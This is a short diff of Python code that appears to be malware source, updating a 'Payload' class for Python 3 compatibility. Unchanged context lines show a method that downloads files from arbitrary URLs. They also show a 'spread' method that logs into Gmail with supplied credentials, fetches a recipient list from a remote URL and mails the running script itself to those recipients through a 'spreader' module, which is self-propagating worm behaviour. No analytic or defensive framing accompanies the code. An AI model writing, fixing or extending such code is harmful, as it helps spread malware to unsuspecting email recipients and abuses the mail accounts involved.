@@ -24,7 +24,7 @@ if sys.version_info[0] < 3:
     import StringIO
 else:
     from urllib import parse as urlparse
-    from urllib.request import urlopen
+    from urllib.request import urlopen, urlretrieve
     from io import StringIO
 
 # modules
@@ -338,7 +338,7 @@ class Payload():
         """
         if url.startswith('http'):
             try:
-                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
+                path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
                 return path
             except Exception as e:
                 log("{} error: {}".format(self.wget.func_name, str(e)))
@@ -1011,7 +1011,7 @@ class Payload():
         try:
             attachment = sys.argv[0]
             gmail, password, url = args.split()
-            recipients = urllib.urlopen(url).read().splitlines()
+            recipients = urlopen(url).read().splitlines()
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
             return '{} error: {}'.format(self.spread.func_name, str(e))
